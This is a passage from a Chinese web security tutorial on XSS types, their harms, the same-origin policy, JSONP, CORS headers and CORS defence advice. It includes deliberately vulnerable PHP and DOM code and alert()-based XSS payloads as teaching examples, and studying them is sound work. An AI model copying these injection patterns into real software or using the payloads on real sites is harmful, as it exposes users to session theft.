&lt;p&gt;反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： &lt;code&gt;&amp;lt;?php echo &amp;quot;&amp;lt;p&amp;gt;hello, $_GET[&#39;user&#39;]&amp;lt;/p&amp;gt;&amp;quot;;?&amp;gt;&lt;/code&gt;  ，那么在访问时设置  &lt;code&gt;/?user=&amp;lt;/p&amp;gt;&amp;lt;script&amp;gt;alert(&amp;quot;hack&amp;quot;)&amp;lt;/script&amp;gt;&amp;lt;p&amp;gt;&lt;/code&gt;  ，则可执行预设好的 JavaScript 代码。&lt;/p&gt;
&lt;p&gt;反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。&lt;/p&gt;
&lt;h2 id=&#34;储存型xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#储存型xss&#34;&gt;#&lt;/a&gt; 储存型 XSS&lt;/h2&gt;
&lt;p&gt;储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。&lt;/p&gt;
&lt;h2 id=&#34;dom-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#dom-xss&#34;&gt;#&lt;/a&gt; DOM XSS&lt;/h2&gt;
&lt;p&gt;DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。&lt;/p&gt;
&lt;p&gt;例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;DOM Based XSS Demo&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token script&#34;&gt;&lt;span class=&#34;token language-javascript&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;input&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;value&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;output&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;innerHTML &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&amp;lt;img src=&#39;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;str&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;&#39;&gt;&amp;lt;/img&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;div&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;output&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;div&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;text&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;input&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;50&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;input&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;button&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;submit&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token special-attr&#34;&gt;&lt;span class=&#34;token attr-name&#34;&gt;onclick&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token value javascript language-javascript&#34;&gt;&lt;span class=&#34;token function&#34;&gt;xsstest&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;输入  &lt;code&gt;x&#39; onerror=&#39;javascript:alert(/xss/)&lt;/code&gt;  即可触发。&lt;/p&gt;
&lt;h2 id=&#34;blind-xss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#blind-xss&#34;&gt;#&lt;/a&gt; Blind XSS&lt;/h2&gt;
&lt;p&gt;Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。&lt;/p&gt;
&lt;h1 id=&#34;危害&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#危害&#34;&gt;#&lt;/a&gt; 危害&lt;/h1&gt;
&lt;p&gt;存在 XSS 漏洞时，可能会导致以下几种情况：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。&lt;/li&gt;
&lt;li&gt;攻击者能够在一定限度内记录用户的键盘输入。&lt;/li&gt;
&lt;li&gt;攻击者通过 CSRF 等方式以用户身份执行危险操作。&lt;/li&gt;
&lt;li&gt;XSS 蠕虫。&lt;/li&gt;
&lt;li&gt;获取用户浏览器信息。&lt;/li&gt;
&lt;li&gt;利用 XSS 漏洞扫描用户内网。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同源策略&#34;&gt;#&lt;/a&gt; 同源策略&lt;/h1&gt;
&lt;h2 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。&lt;/p&gt;
&lt;h3 id=&#34;file域的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#file域的同源策略&#34;&gt;#&lt;/a&gt; file 域的同源策略&lt;/h3&gt;
&lt;p&gt;在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。&lt;/p&gt;
&lt;p&gt;从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。&lt;/p&gt;
&lt;h3 id=&#34;cookie的同源策略&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cookie的同源策略&#34;&gt;#&lt;/a&gt; cookie 的同源策略&lt;/h3&gt;
&lt;p&gt;cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。&lt;/p&gt;
&lt;p&gt;不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  &lt;code&gt;domain&lt;/code&gt;  /  &lt;code&gt;path&lt;/code&gt;  /  &lt;code&gt;secure&lt;/code&gt;  和  &lt;code&gt;http-only&lt;/code&gt;  标记来限定其访问性。&lt;/p&gt;
&lt;p&gt;所以  &lt;code&gt;https://localhost:8080/&lt;/code&gt;  和  &lt;code&gt;http://localhost:8081/&lt;/code&gt;  的 Cookie 是共享的。&lt;/p&gt;
&lt;h3 id=&#34;flashsilverlight跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flashsilverlight跨域&#34;&gt;#&lt;/a&gt; Flash/SilverLight 跨域&lt;/h3&gt;
&lt;p&gt;浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。&lt;/p&gt;
&lt;p&gt;客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。&lt;/p&gt;
&lt;h2 id=&#34;源的更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源的更改&#34;&gt;#&lt;/a&gt; 源的更改&lt;/h2&gt;
&lt;p&gt;同源策略认为域和子域属于不同的域，例如  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;a.com&lt;/code&gt;  /  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;child2.a.com&lt;/code&gt;  /  &lt;code&gt;xxx.child1.a.com&lt;/code&gt;  与  &lt;code&gt;child1.a.com&lt;/code&gt;  两两不同源。&lt;/p&gt;
&lt;p&gt;对于这种情况，可以在两个方面各自设置  &lt;code&gt;document.domain=&#39;a.com&#39;&lt;/code&gt;  来改变其源来实现以上任意两个页面之间的通信。&lt;/p&gt;
&lt;p&gt;另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  &lt;code&gt;null&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源访问&#34;&gt;#&lt;/a&gt; 跨源访问&lt;/h2&gt;
&lt;p&gt;同源策略控制了不同源之间的交互，这些交互通常分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常允许跨域写操作 (Cross-origin writes)
&lt;ul&gt;
&lt;li&gt;链接 (links)&lt;/li&gt;
&lt;li&gt;重定向&lt;/li&gt;
&lt;li&gt;表单提交&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通常允许跨域资源嵌入 (Cross-origin embedding)&lt;/li&gt;
&lt;li&gt;通常不允许跨域读操作 (Cross-origin reads)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能嵌入跨源的资源的一些示例有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;audio&amp;gt;&lt;/code&gt;  嵌入多媒体资源。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;   &lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;  的插件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@font-face&lt;/code&gt;  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;jsonp跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsonp跨域&#34;&gt;#&lt;/a&gt; JSONP 跨域&lt;/h3&gt;
&lt;p&gt;JSONP 就是利用  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。&lt;/p&gt;
&lt;p&gt;服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。&lt;/p&gt;
&lt;p&gt;JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。&lt;/p&gt;
&lt;p&gt;另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。&lt;/p&gt;
&lt;h3 id=&#34;跨源脚本api访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源脚本api访问&#34;&gt;#&lt;/a&gt; 跨源脚本 API 访问&lt;/h3&gt;
&lt;p&gt;Javascript 的 APIs 中，如  &lt;code&gt;iframe.contentWindow&lt;/code&gt;  ,  &lt;code&gt;window.parent&lt;/code&gt; ,  &lt;code&gt;window.open&lt;/code&gt;  和  &lt;code&gt;window.opener&lt;/code&gt;  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  &lt;code&gt;window&lt;/code&gt;  和  &lt;code&gt;location&lt;/code&gt;  对象的访问添加限制。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的方法有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.blur&lt;/li&gt;
&lt;li&gt;window.close&lt;/li&gt;
&lt;li&gt;window.focus&lt;/li&gt;
&lt;li&gt;window.postMessage&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的属性有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.closed&lt;/li&gt;
&lt;li&gt;window.frames&lt;/li&gt;
&lt;li&gt;window.length&lt;/li&gt;
&lt;li&gt;window.location&lt;/li&gt;
&lt;li&gt;window.opener&lt;/li&gt;
&lt;li&gt;window.parent&lt;/li&gt;
&lt;li&gt;window.self&lt;/li&gt;
&lt;li&gt;window.top&lt;/li&gt;
&lt;li&gt;window.window&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中  &lt;code&gt;window.location&lt;/code&gt;  允许读 / 写，其他的属性只允许读&lt;/p&gt;
&lt;h3 id=&#34;跨源数据存储访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源数据存储访问&#34;&gt;#&lt;/a&gt; 跨源数据存储访问&lt;/h3&gt;
&lt;p&gt;存储在浏览器中的数据，如  &lt;code&gt;localStorage&lt;/code&gt;  和  &lt;code&gt;IndexedDB&lt;/code&gt; ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。&lt;/p&gt;
&lt;h2 id=&#34;cors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cors&#34;&gt;#&lt;/a&gt; CORS&lt;/h2&gt;
&lt;p&gt;CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。&lt;/p&gt;
&lt;h3 id=&#34;常见请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见请求头&#34;&gt;#&lt;/a&gt; 常见请求头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Origin
&lt;ul&gt;
&lt;li&gt;预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Origin: &amp;lt;origin&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Method
&lt;ul&gt;
&lt;li&gt;声明请求使用的方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Method: &amp;lt;method&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Headers
&lt;ul&gt;
&lt;li&gt;声明请求使用的 header 字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常见返回头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见返回头&#34;&gt;#&lt;/a&gt; 常见返回头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Access-Control-Allow-Origin
&lt;ul&gt;
&lt;li&gt;声明允许访问的源外域 URI&lt;/li&gt;
&lt;li&gt;对于携带身份凭证的请求不可使用通配符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*``Access-Control-Allow-Origin: &amp;lt;origin&amp;gt; | *&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Expose-Headers
&lt;ul&gt;
&lt;li&gt;声明允许暴露的头&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Max-Age
&lt;ul&gt;
&lt;li&gt;声明 Cache 时间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Max-Age: &amp;lt;delta-seconds&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Credentials
&lt;ul&gt;
&lt;li&gt;声明是否允许在请求中带入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Credentials: true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Methods
&lt;ul&gt;
&lt;li&gt;声明允许的访问方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Methods: &amp;lt;method&amp;gt;[, &amp;lt;method&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Headers
&lt;ul&gt;
&lt;li&gt;声明允许的头&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御建议&#34;&gt;#&lt;/a&gt; 防御建议&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如非必要不开启 CORS&lt;/li&gt;
&lt;li&gt;定义详细的白名单，不使用通配符，仅配置所需要的头&lt;/li&gt;
&lt;li&gt;配置  &lt;code&gt;Vary: Origin&lt;/code&gt;  头部&lt;/li&gt;
&lt;li&gt;如非必要不使用  &lt;code&gt;Access-Control-Allow-Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;限制缓存的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;阻止跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阻止跨源访问&#34;&gt;#&lt;/a&gt; 阻止跨源访问&lt;/h2&gt;
&lt;p&gt;阻止跨域写操作，可以检测请求中的  &lt;code&gt;CSRF token&lt;/code&gt;  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。&lt;/p&gt;
